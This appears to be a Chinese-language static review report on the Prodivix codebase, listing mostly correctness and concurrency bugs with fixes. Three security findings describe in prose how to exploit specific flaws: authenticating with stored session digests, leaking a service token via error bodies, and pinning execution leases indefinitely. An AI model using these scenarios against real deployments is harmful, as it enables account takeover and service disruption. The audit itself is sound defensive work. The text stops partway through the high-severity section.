# Prodivix 仓库全量静态审查报告

## 1. 元信息

| 项目         | 内容                                                |
| ------------ | --------------------------------------------------- |
| 审查日期     | 2026-07-22                                          |
| 审查对象     | Prodivix 仓库(`D:/Projects/prodivix`)全量源码       |
| 审查方法     | 59 个源码分块审查 + 3 个全局专项扫描 + 逐条对抗验证 |
| 审查单元总数 | 62(全部正常完成,`unitsOk = 62`)                     |
| 报告语言     | 简体中文(GitHub Flavored Markdown)                  |

说明:本报告正文仅收录通过去重且未被对抗验证驳回的发现。每条发现包含标题、位置(`path:line`,仓库相对路径,可点击)、类别、置信度、验证状态(已对抗验证 / 未验证)、详情、失败场景、修复建议;凡含 `verifierNote` 者附「验证备注」。

---

## 2. 总览统计

### 2.1 审查与处置计数

| 指标                             | 数量    |
| -------------------------------- | ------- |
| 审查单元(units)                  | 62      |
| 正常完成单元(unitsOk)            | 62      |
| 原始发现(found)                  | 231     |
| 对抗验证确认(confirmed)          | 105     |
| 对抗验证驳回(refuted)            | 16      |
| 未验证(unverified)               | 110     |
| 去重剔除(dedupDropped)           | 1       |
| **正文收录发现(去重后、未驳回)** | **214** |

### 2.2 按严重度分布

| 严重度   | 数量    |
| -------- | ------- |
| critical | 0       |
| high     | 20      |
| medium   | 83      |
| low      | 111     |
| **合计** | **214** |

### 2.3 按类别分布

| 类别           | 数量    |
| -------------- | ------- |
| correctness    | 120     |
| error-handling | 38      |
| concurrency    | 21      |
| security       | 19      |
| resource-leak  | 8       |
| performance    | 6       |
| architecture   | 1       |
| type-safety    | 1       |
| **合计**       | **214** |

---

## 3. 发现正文(按严重度分组)

> 分组顺序:critical → high → medium → low;同组内按类别聚类。

### 3.1 Critical

无 critical 级发现。

---

### 3.2 High(20 条)

#### 3.2.1 correctness

##### H-C-01 `jsonBytesEqual` 用 float64 比较导致大整数内容变更被静默丢弃

- **位置**: [`apps/backend/internal/modules/workspace/store_operation_commit.go:512`](apps/backend/internal/modules/workspace/store_operation_commit.go#L512)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: be-ws-b

**详情**: `buildWorkspaceCommitChanges` 用 `jsonBytesEqual`(store_helpers.go:517-527,默认 `json.Unmarshal` → float64 + `reflect.DeepEqual`)判定 `contentChanged`。patch 引擎全程用 `UseNumber` 精确保留数值(patch_pointer.go:44-48、operation_commit_types.go:498),因此提交内容可含 >2^53 的精确整数,而比较时两个不同的大整数折叠为同一 float64 → `contentChanged=false`。若同时 `metadataChanged=false`,则走 `continue`,该文档既不写入 `DocumentsToWrite` 也不进 `updatedDocuments`。同一比较还削弱了 reverseOps 回环校验(operation_commit_apply.go:146/214/307):仅差大整数的 reverseOps 会被误判为已还原,undo 历史失真。

**失败场景**: project-config 文档内容 `{"kind":"config","value":{"n":9007199254740992}}`,命令 `replace /value/n → 9007199254740993`。单独提交时:`hasDurableDelta=false`,返回误导性 422 'workspace operation has no durable authoring delta',用户真实编辑被永久拒绝;与另一文档写入同事务提交时:提交成功但该文档变更被静默跳过,Outbox 视为已提交,本地副本与 Canonical Workspace 永久分叉(数据丢失)。纳秒时间戳(2^60 附近 float64 间隔为 256)使该场景在 data/config 域很现实。

**修复建议**: `jsonBytesEqual` 改用与 patch_compare.go `jsonDeepEqual` 相同的 `UseNumber` + `normalizeJSONNumbers` 归一化后比较;或统一调用 `jsonDeepEqual`。

##### H-C-02 settings 提交与快照导入经 `normalizeJSONDocument` 静默损坏 >2^53 的整数

- **位置**: [`apps/backend/internal/modules/workspace/store_settings_commit.go:48`](apps/backend/internal/modules/workspace/store_settings_commit.go#L48)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: be-ws-b

**详情**: 细节均属实,仅一处引用偏差:operation_commit_types.go:802 是文档 ID 排序校验,2^53 保护实际在 :85/:98/:151 及 revision_limits.go,不影响结论。

**失败场景**: 客户端 `POST /workspaces/ws_1/settings/commit`,body `settings={"deadlineNs":9007199254740993}`。服务端 `normalizeJSONDocument` 将其解码为 float64(9007199254740992)再序列化,持久化并返回 9007199254740992;重放请求命中相同 request_hash,永远返回损坏值。任何含大整数(纳秒时间戳、外部大 ID)的 settings 或导入文档都被静默截断,且无任何错误提示。

**修复建议**: `normalizeJSONDocument` 改用 `json.NewDecoder(...).UseNumber()` 解码后再 Marshal(与 patch_pointer.go:46 的 `decodeJSONValue` 一致),保留数值字面量;或直接用 `json.Compact` 做规范化而不经过 `any`。

**验证备注**: 路径真实:routes.go:22 暴露端点;handler 以 RawMessage 保留原始字节,store_settings_commit.go:48 调 `normalizeJSONDocument`(store_helpers.go:308-311)用 encoding/json 解码入 `any`(Go1.24 即 float64)再 Marshal,>2^53 整数被舍入。损坏值写入 workspace_settings(:147)、作 mutation.Settings 返回(:163)。

##### H-C-03 扩展 main 指向从不生成的 ./out/index.js,F5 与打包产物均无法激活

- **位置**: [`apps/vscode/package.json:14`](apps/vscode/package.json#L14)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: apps-cli-vscode

**详情**: main 指向 `./out/index.js`,但 esbuild 只产 `dist/extension.js`,`watch:tsc` 为 `--noEmit`,默认任务与发布链均不生成 out/;`.vscodeignore` 又排除 `out/**` 与 `src/**`,故 F5 与 VSIX 都无法激活。唯一夸大:pir 语言文件关联为声明式仍会注册,但其 language-configuration 路径 `./language/` 在 VSIX 中缺失,语言功能仍不可用;另 esbuild 入口 extension.ts 注册的是 helloWorld,真正声明的 previewPIR 在 index.ts。

**失败场景**: 开发者按 F5 "Run Extension"(preLaunchTask 只跑 watch:tsc --noEmit + esbuild)→ 扩展宿主加载 main `./out/index.js` → ERR_MODULE_NOT_FOUND,扩展无法激活;或 vsce package 后安装 VSIX → 同样找不到入口,`prodivix.previewPIR` 与 pir 语言功能全部不可用。

**修复建议**: 将 main 改为 `"./dist/extension.js"` 并使 esbuild 入口指向真正的注册逻辑(src/index.ts);或保留 out/ 方案则把构建任务改为真正 emit 的 tsc 并从 `.vscodeignore` 移除 `out/**`。

**验证备注**: package.json:14 main=./out/index.js;esbuild.js:30/37 仅产 dist/extension.js;watch:tsc(48行)为 --noEmit;vscode:prepublish→package 同样只出 dist;.vscodeignore:3/5 排除 out/** 与 src/**。

##### H-C-04 lineHeight 编辑把 "24px" 写成无单位 "20",行高语义从像素变成倍数

- **位置**: [`apps/web/src/editor/features/blueprint/editor/inspector/panels/TypographyPanel.tsx:146`](apps/web/src/editor/features/blueprint/editor/inspector/panels/TypographyPanel.tsx#L146)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-bp-insp-b

**详情**: lineHeight 的 onChange 为 `typeof value === 'number' ? String(value) : (value ?? '')`,意图是保留无单位行高。但 `UnitInput.toOutput`(components/UnitInput.tsx:186)在单位为 px 且数字完整时返回 number。因此任何带 px 的 lineHeight 字符串被编辑后都会丢失 px 单位:原值 "24px" 被 parseValue 拆为 amount 24/unit px,改成 20 后回调得到 number 20,写入 style 的是 "20"——React/CSS 将其解释为无单位倍数 20×font-size,而非 20px。

**失败场景**: 节点 `style.lineHeight="24px"`,用户在 Typography 面板把行高改为 20(单位仍显示 px)→ 写入 "20" → 16px 字体下渲染行高≈320px,版式被撑爆;且该错误静默写入 canonical PIR style,刷新后依然存在。

**修复建议**: lineHeight 应与其他长度字段一致走 `readCssValue(value) ?? ''`(number→`${n}px`),或显式区分:仅当原值为无单位数字/字符串时才写无单位值,px 单位输出必须保留 "px" 后缀。

**验证备注**: 已读代码确认:lineHeight="24px" 经 parseValue(UnitInput:171)拆为 24/px;编辑后 toOutput(:186)在 px+完整数字时返回 number;TypographyPanel:146 特判 String(20)→"20",updateStyleValue(helpers:76)原样写入;PIRElementProjection:127-133 未归一化直传 React,lineHeight 为 unitless 属性。

##### H-C-05 `toBoxSpacingShorthand` 在任一边为空时错位拼接,四边值被写乱

- **位置**: [`apps/web/src/editor/features/blueprint/editor/inspector/panels/layoutGroup/layoutPanelHelpers.ts:131`](apps/web/src/editor/features/blueprint/editor/inspector/panels/layoutGroup/layoutPanelHelpers.ts#L131)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-bp-insp-b

**详情**: `toBoxSpacingShorthand` 中 `if (all.some((item) => !item)) return all.filter(Boolean).join(' ')` 直接把非空边按 top→right→bottom→left 顺序过滤后拼接。CSS 盒模型简写按 token 个数解释(2 个=垂直/水平,3 个=top/right+left/bottom),过滤掉空值后剩余 token 的位置语义完全改变。该函数被 SpacingControl.tsx:125 的单边编辑器在每次改单边时调用,结果经 updateSpacingValue 写入 canonical 节点 style/props。

**失败场景**: `margin="8px 16px"`(上下8、左右16),用户展开单边编辑清空 top:`sides={top:'',right:'16px',bottom:'8px',left:'16px'}` → 生成 "16px 8px 16px" → CSS 解析为 top=16px/right=8px/bottom=16px/left=8px。用户只想清 top,结果四边全部被错置并写入 Workspace 状态;只保留 left=4px 时会生成 "4px" 应用到四边。

**修复建议**: 任一边为空时不要生成简写:要么回退为 4-value 形式并把空边当作 0(与 parseBoxSpacing 对称),要么保留原始 value 不提交(返回原串),或改用 marginTop 等逐边属性写入,避免用过滤后的 token 序列表达带空洞的四边状态。

**验证备注**: layoutPanelHelpers.ts L131-133:任一边为空即 `all.filter(Boolean).join(' ')`,非空 token 顺序拼接丢失位置语义。路径可达:UnitInput.tsx L293-295 清空触发 onChange(undefined);SpacingControl.tsx L122-130 经 readCssValue??'' 调 toBoxSpacingShorthand。

##### H-C-06 `toEditableTrigger` 仅重建 https:// 外链,非 https 的 open-url 绑定在写回时被静默丢弃

- **位置**: [`apps/web/src/editor/features/blueprint/editor/inspector/projection/bindingProjection.ts:229`](apps/web/src/editor/features/blueprint/editor/inspector/projection/bindingProjection.ts#L229)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-bp-insp-c

**详情**: 主干属实:非 https 的 open-url 在 toEditableTrigger 返回 null 被 toEvents 静默丢弃,且 updateSelectedNode 对整棵子树反投影 + updatePirElementNode 整体替换节点,任意编辑即删除既有绑定。仅次路径措辞需修正:Destination 输入 http:// 时因输入值源自 canonical 投影,UI 会可见回退而非"看似成功",但同样不报错、从不持久化。

**失败场景**: 文档中存在 `events.onClick={kind:'open-url',href:'http://example.com'}`。用户在 Inspector 里对该元素甚至其任意祖先做任一编辑(如改文本)→ updateSelectedNode 对整个子树调用 toElementNode → http:// 事件被丢弃且 jsonEqual 判定有差异 → 提交后该链接绑定被静默删除;用户在 Destination 输入 http:// 地址也看似成功实则从未持久化。

**修复建议**: 写回判断与 `@prodivix/router` 的 `getNavigateLinkKind` 对齐:凡 `getNavigateLinkKind(destination)==='external'`(https 与 http)均重建 `{kind:'open-url', href}`;或在投影侧对无法写回的 href 标记 `editable:false` 并给出 diagnostic,而不是静默丢弃。

**验证备注**: projectTrigger(66-73)对任意 href 投影 `{to:href,target:'_blank'}` 且无 routeId;toEditableTrigger 仅第229行 https 正则重建 open-url,否则第234行因缺 routeId 返回 null;toEvents 第248行 open-url 非 isReadonlyTrigger 且 editable:true 不保留原值,第254行 binding 为 null 即跳过。

##### H-C-07 `toEvents` 允许可编辑触发器以同名事件覆盖 call-code 等领域所有的只读绑定

- **位置**: [`apps/web/src/editor/features/blueprint/editor/inspector/projection/bindingProjection.ts:254`](apps/web/src/editor/features/blueprint/editor/inspector/projection/bindingProjection.ts#L254)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-bp-insp-c

**详情**: 缺陷真实但复现步骤不准:addTrigger 经 updateSelectedNode 即时提交,默认 trigger-1 的 to:'' 在 toEditableTrigger 返回 null,无事务且无草稿态,新行根本不渲染,用户无法填 URL。实际可达路径:同节点同时存在 call-code(如 onClick,只读)与另一 DOM 事件的可编辑绑定,将可编辑行的触发器下拉改为 onClick 即触发覆盖;下游 updatePirElementNode 仅结构校验,提交后静默销毁代码所有绑定。两可编辑同名触发器亦按循环顺序互覆。

**失败场景**: 按钮已有 onClick 的 call-code 绑定。用户点 Add trigger(新增 key 'trigger-1'、trigger 默认 'onClick'),填入 https://x 并提交 → `result['onClick']` 先存 call-code 后被 open-url 覆盖 → 提交后 onClick 变成外链跳转,代码所有的触发器绑定被静默销毁,无任何提示。两个可编辑触发器选同一 DOM 事件时也会互相覆盖丢失其一。

**修复建议**: 写入前检查目标 trigger 名是否已被只读绑定占用:若 `current[trigger]` 为 isReadonlyTrigger 则拒绝该可编辑事件(返回诊断或保留只读原值),不要把 `result[trigger]` 覆盖为可编辑绑定;可同时对重名可编辑触发器去重报错。

**验证备注**: bindingProjection.ts L246-258:第一轮按原 key 保留 readonly(L248-250),但可编辑项写 `result[trigger.trim()]=binding`(L252-254);第二轮 `!result[key]` 恢复(L257)在覆盖后失效。InspectorTriggerItem 下拉(L170-189)不排除已占用事件,updateTrigger(L1409-1460)无同名/只读占用校验。

##### H-C-08 `toDataScope` 在 view.data 缺失时整体删除 data,绕过非字面量绑定的保护

- **位置**: [`apps/web/src/editor/features/blueprint/editor/inspector/projection/bindingProjection.ts:166`](apps/web/src/editor/features/blueprint/editor/inspector/projection/bindingProjection.ts#L166)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-bp-insp-c

**详情**: toBinding/toBindingRecord 都会保留 current 中的非字面量(code 等)绑定,但 toDataScope 开头 `if (!next) return undefined;` 使整个 data 作用域被丢弃,其中 code-owned 的 data.source/data.value/data.extend.* 一并消失。触发路径真实存在:InspectorDataScopeFields 在取消 Mount data model JSON 勾选或清空 Schema JSON 时执行 `delete nextNode.data`,而该开关对含非字面量绑定的节点不禁用;collectReadonlyBindingDiagnostics 还专门提示 data.* 为 CodeReference 所有、只读。同文件 applySchemaDraft 的 `delete nextData.extend` 路径反而因 `toBindingRecord(undefined, current.extend)` 受保护,凸显此处不对称。

**失败场景**: 元素的 data.value(或 data.source)由 CodeReference 拥有(投影为 code 绑定且界面提示只读)。用户在 Data 面板取消 Mounted 勾选或清空 Schema 文本后失焦 → view.data 被删除 → toDataScope 返回 undefined → 提交的 PIR 文档失去整个 data 作用域,代码所有的绑定被静默销毁。

**修复建议**: toDataScope 在 next 为 falsy 时不要直接返回 undefined:仿照 toBindingRecord,用 `toBinding(undefined, current?.source/value/mock)` 与 `toBindingRecord(undefined, current?.extend)` 保留 current 中的非字面量绑定,仅当结果为空对象时才返回 undefined。

**验证备注**: toDataScope(166) `if (!next) return undefined;` 整体丢弃 data,而 toBinding(156)/toBindingRecord(135-139) 保留 current 非字面量绑定,不对称属实。InspectorDataScopeFields 74/178 行在清空 Schema 失焦或取消 Mounted 时 `delete nextNode.data`,控件无 disabled。

##### H-C-09 布局范式调色板项未接入 `buildLayoutPatternNode`,插入产生无效运行时类型节点

- **位置**: [`apps/web/src/editor/features/blueprint/layoutPatterns/registry.ts:47`](apps/web/src/editor/features/blueprint/layoutPatterns/registry.ts#L47)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-bp-data

**详情**: 细节修正:pirValidator 对 element 节点是 `case element: break`,完全不校验 type;渲染器对未注册类型是 PIRElementProjection return null 直接渲染为空,组件树仍显示该节点。结论不变:三项均产生空白死节点,Pattern 面板永不激活。

**失败场景**: 用户在组件库布局范式分组双击或拖入 Split Layout:applyPaletteItemInsertion 生成 type=PdxLayoutPatternSplit、props 含 patternId=split 的单个 element 节点并通过校验写入 ui.graph;渲染器无该组件,画布出现空白节点,预期的 Grid 双列结构、role 子节点与 Inspector 的 Pattern 参数面板均不出现。Holy Grail / Dashboard Shell 同样损坏。

**修复建议**: 在调色板插入链路识别 item.defaultProps.patternId(或给布局范式项增加显式 recipe 标记),调用 `buildLayoutPatternNode({patternId, createId})` 生成范式子树并经 PIRGraphFragment 插入;或为这三个项注册 blueprintTemplate 贡献,使 instantiateTemplate 路径生成结构。

**验证备注**: 路径真实可达:三项仅 defaultProps.patternId 无 runtimeType;nativeCorePlugin trustLevel core → projectionResolver:514 creationMode native → paletteQueryService:67 recipe kind native → paletteCreation:292 instantiateSingleElement。

##### H-C-10 `cloneNodeGraphDocument` 克隆时未重写 executor.slotId,克隆图沿用源图代码槽身份

- **位置**: [`apps/web/src/editor/features/development/reactflow/nodeGraphDocumentProjection.ts:289`](apps/web/src/editor/features/development/reactflow/nodeGraphDocumentProjection.ts#L289)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-dev-a

**详情**: 克隆图节点 executor.slotId 未随 targetDocumentId/新节点 id 重生成,与源图共享同一代码槽身份:注册表 getSlot/getBindingProjection 首命中导致打开定义跨图误跳、槽级 impact/重命名预览遮蔽其中一个绑定。注:删除源图后因 semanticReferenceId 按 (ws,B,N-prime) 独立派生,绑定仍可解析(功能自愈),但 slotId 永久别名源图身份,违反 fail-closed 身份契约。

**失败场景**: 图 A 的 code 节点 N 绑定 CodeArtifact(slotId=slot(A,N));点击 Clone 得到图 B、节点 N-prime。其 executor.slotId 仍为 slot(A,N):在 B 中打开 CodeSlot 定义会跳到图 A 的节点;删除图 A 后 B 的绑定成为悬空别名而非按契约 fail-closed;两个存活绑定共享同一 slotId,owner-impact/重命名预览把 B 的 executor 误归 A 所有。

**修复建议**: 为 cloneNodeGraphDocument 增加 targetDocumentId 参数,克隆时用 `createNodeGraphExecutorCodeSlotId(targetDocumentId, newNodeId)` 重新生成 executor.slotId(duplicateGraph 的 factory 内已生成 createdDocumentId,可直接传入);或在克隆时剥离 executor 绑定并要求重新绑定。

**验证备注**: 已核实:clone(投影.ts:289-293)只改 id/parentId/groupBoxId,executor 原样展开;duplicateGraph(管理器:140-149)换新 documentId/节点 id 却不传 targetDocumentId。provider.ts:56-59 信任存储 slotId;codeSlotRegistry.ts:46-53 getSlot 首命中无去重。

##### H-C-11 `publish:packages` 发布的 @prodivix/ui 依赖了从未发布的 @prodivix/router

- **位置**: [`package.json:103`](package.json#L103)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: infra-scripts

**详情**: 描述基本准确,补充:当前已发布的 @prodivix/ui@0.1.2 的 deps 不含 router(router 依赖与 PdxRoute 是 0.1.2 发布后新增),现存版本仍可安装;问题自下一次发布(0.1.3+)起必现,失败为 E404(包不存在)而非 ETARGET。另 router 自身依赖 @prodivix/authoring(workspace 协议,同样未发布),修复时需一并处理该级联依赖。

**失败场景**: 推送 packages-v tag 触发 npm-packages.yml(或本地 release:packages:patch)→ @prodivix/ui@0.1.3 发布成功 → 外部用户 npm install @prodivix/ui → 解析依赖 @prodivix/router 时 registry 404/ETARGET,任何消费者都无法安装该包。

**修复建议**: 把 @prodivix/router 加入 bump-packages.mjs 的 PACKAGE_PATHS 和 publish:packages 发布序列(并确保先于 ui 发布),或将 ui 对 router 的依赖改为 devDependencies/内联所需类型。

**验证备注**: 确认。root package.json:103 publish:packages 与 bump-packages.mjs:5-9 PACKAGE_PATHS 仅 shared/themes/ui;ui/package.json:54 deps 声明 @prodivix/router,PdxRoute.tsx:4-11 真实 import flattenRouteManifest 等、经 index.ts:49 导出、vite.config.ts:6 external。

##### H-C-12 WGSL `var<address_space>` 声明被错误符号化:地址空间关键字被当作变量名

- **位置**: [`packages/code-language/src/shader/wgslLanguageAnalyzer.ts:423`](packages/code-language/src/shader/wgslLanguageAnalyzer.ts#L423)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-code-language

**详情**: collectSymbols 的变量声明分支用 `nextIdentifierIndex(input.tokens, index + 1, [':','=',';'])` 寻找变量名。WgslScanner 把 `var<uniform> params: Params` 切成 var/小于号/uniform/大于号/params/冒号/Params(尖括号为独立 token,uniform 为 ident 类型)。stopLexemes 不含小于号,于是 nameIndex 落在 uniform 上:addSymbol 创建名为 uniform 的伪符号,真正的绑定 params 没有任何符号。后续 var uniform 的地址空间 token 还会被解析为伪符号的 occurrence。伪符号 moduleLevel=true,会经 shaderSemanticContribution 以 code-export 发布进 Workspace Semantic Index。var storage read_write、var private、var workgroup 同样中招。

**失败场景**: 源码 group0 binding0 var uniform params Params 加 fn f 返回 params.scale:getDefinition/getReferences/getCompletions/prepareRename 对 params 全部返回 missing;semantic contribution 发布名为 uniform、signature 为 var uniform 的假符号,而 params 缺失,Semantic Index 的符号/引用投影与实际源码不符。

**修复建议**: 在变量分支中,若关键字后的下一个 token 是小于号,先用 findMatchingToken 跳到匹配的大于号之后再调用 nextIdentifierIndex;或把小于号加入 stopLexemes 并在遇到模板列表时整体跳过模板段后再找名字。

##### H-C-13 `contentDigest` 的文件排序依赖默认 locale 排序,跨运行时会产生不同摘要

- **位置**: [`packages/runtime-core/src/executableProject.ts:178`](packages/runtime-core/src/executableProject.ts#L178)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-runtime-core

**详情**: `normalizeFiles` 用 `files.sort((left, right) => left.path.localeCompare(right.path))` 排序,随后 createContentDigest(第 301-305 行)按该顺序把每个文件的 path/sourceTrace/contents 写入 sha256。localeCompare 不指定 locale 时使用宿主默认 locale 与 ICU 排序规则,对大小写、标点、CJK 字符的排序与码元序不一致且随环境变化。同样问题存在于 executableProjectNormalization.ts(partitionRevisions:686、collections:431、fixtures:539、capabilities:831、publicBuildConfiguration:900、canonicalClone:166)。而 runtime-remote 的 remoteExecutableProjectCodec.ts:235 会在远端重算并强校验 contentDigest 不等。

**失败场景**: 项目含 Vendor.js 与 app.js(或 a-b.ts/aB.ts、中文文件名):zh-CN 浏览器与 en-US 的 remote-runner 容器对同一输入算出不同文件顺序,contentDigest 不同,远端解码抛 digest 校验失败,或 control plane 以 digest 为缓存键时命中不到/身份漂移,同一快照被当成两个项目。

**修复建议**: 所有进入 contentDigest 的排序改用确定性码元比较,如 `(a, b) => (a < b ? -1 : a > b ? 1 : 0)`,或显式 `localeCompare(other, 'en', { sensitivity: 'variant', numeric: false })` 并固定 usage,保证与操作系统 locale/ICU 版本无关。

#### 3.2.2 concurrency

##### H-CC-01 i18n 每次击键即从过期渲染闭包全量持久化,输入中字符丢失/跨格更新被覆盖

- **位置**: [`apps/web/src/editor/features/resources/I18nResourcePage.tsx:227`](apps/web/src/editor/features/resources/I18nResourcePage.tsx#L227)
- **类别**: concurrency ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-resources

**详情**: 机制1更精确说法:重置不依赖 value prop 变化,而是 React19 每次 commit 因内联 onChange/onFocus 闭包产生新 props 即触发 updateInput 无条件同步 DOM 至过期 store 值;onMouseEnter(行271)与 onFocus(行314)均可触发。机制2需两次编辑落在同一渲染/IDB 窗口内,窗口窄但真实。

**失败场景**: 在 zh-CN 的 save 格输入「你好」:键入「你」触发 persist1(往返约数十毫秒);期间鼠标掠过其他行触发 onMouseEnter 重渲染,store 仍为旧值空串,input DOM 被重置为空;再键入「好」时 event.target.value 为「好」,最终 workspace 持久化值为「好」,「你」永久丢失。

**修复建议**: 为翻译表格引入本地编辑缓冲(单元格本地 state 或防抖提交),持久化时从 `useEditorStore.getState()` 读取最新文档值并序列化/排队写入,避免用渲染期快照做全量替换。

**验证备注**: 属实。Page:227 用渲染期 resourceValue 闭包做 updater,fire-and-forget;workspaceVfsOutboxExecutor.ts:44 先 await IDB enqueue 再 dispatchWorkspaceCommand,击键到 store 更新间必有异步窗口。Panels.tsx:271 每行 onMouseEnter 必触发重渲染;本仓 react-dom@19.2 中 memoizedProps 不等于 newProps。

##### H-CC-02 activate 事务跨慢速 adapter 调用持有全局 revision,跨插件并发提交导致激活被误判冲突且 Host 不重试

- **位置**: [`packages/plugin-host/src/lifecycle/runtimeLifecycle.ts:342`](packages/plugin-host/src/lifecycle/runtimeLifecycle.ts#L342)
- **类别**: concurrency ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-plugin-host

**详情**: 发现属实。需修正一点:原修复建议「将 beginTransaction 推迟到 adapter.activate 之后」与 lifecycle spec 9.2 步骤5冲突——adapter 正是通过 ScopedContributionTransaction 在 activate 期间 stage 注册项,事务必须在 adapter 调用期间保持 open,因此无法做成短临界区;符合 spec 10.4 的修复应为 Host 侧对 retryable 的 TRANSACTION_CONFLICT 有界重试。另:冲突检测本身是设计行为,缺陷在于 Host 完全未实现 10.4 要求的显式重试。

**失败场景**: 宿主启动时发现插件 A、B 并自动激活。A 的 activate 打开事务后等待沙箱启动(adapter.activate 耗时数秒);期间 B 的 discover 提交 palette contribution(revision+1)。A 的 commit 命中 PLG-3011,已成功建立的会话被立即 deactivate,activation contributions 被回滚,A 的 runtime 变为 failed,调用方收到失败,必须人工 retry——尽管两个插件之间没有任何真实冲突。B 的 disable 或另一插件的 runtime 崩溃清理同样会触发。

**修复建议**: 按 spec 10.4 在 Host 侧对可重试的 TRANSACTION_CONFLICT(retryable: true)实现有界重试循环:重读 getRevision()/permission 快照后重建事务重新 stage+commit;并将 beginTransaction/expected revision 的捕获推迟到 adapter.activate 成功之后,使 commit 成为短临界区。

**验证备注**: 逐行核实:runtimeLifecycle.ts:342 在 340-346 beginTransaction 捕获 getRevision();389-413 await adapter activate(默认超时 30000,pluginHostContext.ts:75);438 才 commit。contributionRegistry.ts:374 revision 不等于 expected 即 failCommit(TRANSACTION_CONFLICT)。

##### H-S-01 legacy 明文令牌回退查询允许直接用数据库中存储的 SHA-256 digest 完成认证

- **位置**: [`apps/backend/internal/modules/auth/store.go:210`](apps/backend/internal/modules/auth/store.go#L210)
- **类别**: security ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: be-env-auth

**详情**: 回退路径真实可利用,但「永不过期」不准确:行210回退复用同一 query,含 expires_at 大于 NOW(行200-202),且行224的迁移 UPDATE 只改写 id/token,不延长 expires_at。因此攻击者窗口受会话原 TTL 限制(Create 默认24h,行163-164),而非持久无限访问;其余(无版本列、digest 直接认证、改写后合法用户被踢下线)均属实。

**失败场景**: 攻击者通过只读备份/副本/日志获得 sessions.token 列中某活跃会话的 digest D,发送 Authorization Bearer D:主查询 sha256(D) 不命中,回退 WHERE token 等于 D 命中该行,以该用户身份通过 RequireAuth;迁移 UPDATE 把行改写为 sha256(D),攻击者可继续使用 D,合法用户被踢下线。

**修复建议**: 为 sessions 增加版本列(或将 digest 存入独立的 token_digest 列),仅对显式标记为未迁移的行执行明文回退;或给回退设置硬性下线期限,迁移完成后删除该路径。

**验证备注**: 读 store.go:Create(186)存 sessionTokenDigest;Get 主查询用 sha256(token)(203-204),ErrNoRows 后行210按原文 token 回退同一查询,行224 UPDATE 将 token 改写为 sha256(原文)。schema(database.go:66-74)sessions 仅 token TEXT PRIMARY KEY 加可空 id,无哈希/版本标记列。

##### H-S-02 终端网关仅在 2xx 响应上检查 clientToken 回显,非 2xx 错误体会原样泄露服务令牌

- **位置**: [`apps/backend/internal/modules/remoteexecution/terminal.go:270`](apps/backend/internal/modules/remoteexecution/terminal.go#L270)
- **类别**: security ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: be-remoteexec

**详情**: remoteRequest(handler.go:456)对远程执行服务附带全局服务令牌 Authorization Bearer clientToken。HandleTerminalOpen/Resume/Action 的防回显守卫 `bytes.Contains(responseBody, []byte(handler.clientToken))` 只写在 2xx 条件内(270、299、336 行),非 2xx 的响应体不经任何检查直接 proxyTerminalJSON 返回给客户端。同样的缺失也存在于 HandleEnvelope(handler.go:604)与 HandleArtifactContent(handler.go:802,完全没有回显检查)。代码本身在 2xx 路径上做了回显拦截,说明远程服务回显令牌是已知风险,但错误响应恰恰是框架最常回显 Authorization 头的场景。

**失败场景**: 已登录用户对自有 execution 调用 POST /api/remote-executions/{id}/terminal-sessions;远程服务返回 4xx/5xx 且错误体回显收到的 Authorization 头(如 invalid bearer service-token)→ 该用户的浏览器直接收到全局 clientToken。持有者可绕过 Backend 的全部 workspace/权限/会话校验,直接以该令牌调用远程执行服务创建任意执行。

**修复建议**: 对远程响应体(无论状态码)统一做 clientToken/terminalToken 包含检测:命中即返回 502 并告警;或改为永不转发原始错误体,只转发经校验的结构化错误码。HandleEnvelope 与 HandleArtifactContent 应套用同一守卫。

##### H-S-03 `leaseDurationMs` 无上限校验,认证 worker 可永久占用执行配额并毒化租约行

- **位置**: [`apps/remote-runner-control-plane/src/httpHandler.ts:512`](apps/remote-runner-control-plane/src/httpHandler.ts#L512)
- **类别**: security ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: app-runner-cp

**详情**: positiveInteger(202-206 行)只校验大于等于1 的 safe integer,无上限。claims(484 行)与 lease 续租(512 行)把 leaseDurationMs 原样传给 controlPlane.claimNext/renewLease,仓库直接以 now 加 leaseDurationMs 写 lease_expires_at(postgresExecutionRepository.ts:453、491)。claimNext 在事务内,溢出时 load 抛错可回滚;但 renewLease 是单条自动提交的 pool.query,UPDATE 提交后才在 integer()(postgresExecutionRepository.ts:66-71)读回 expiresAt,非 safe integer 即抛 Stored lease expiresAt is corrupt,毒化值永久落库。

**失败场景**: 被攻陷的 worker 先正常 claim,再 POST /internal/v1/executions/{id}/lease 带 leaseDurationMs 约 9.007e15:若 now 加 duration 仍为 safe integer,租约延长约 28.5 万年,claimNext 的 lease_expires_at 小于等于 now 回收条件永远不成立,客户端 cancel 只能进 cancelling 无法终结,配额槽(默认 4)被永久占用,重复数次即可瘫痪整个服务;若越过 MAX_SAFE_INTEGER,该行所有 load 永久抛错,client cancel 与 get 恒返回 500,worker 弃置后只能人工改库恢复。

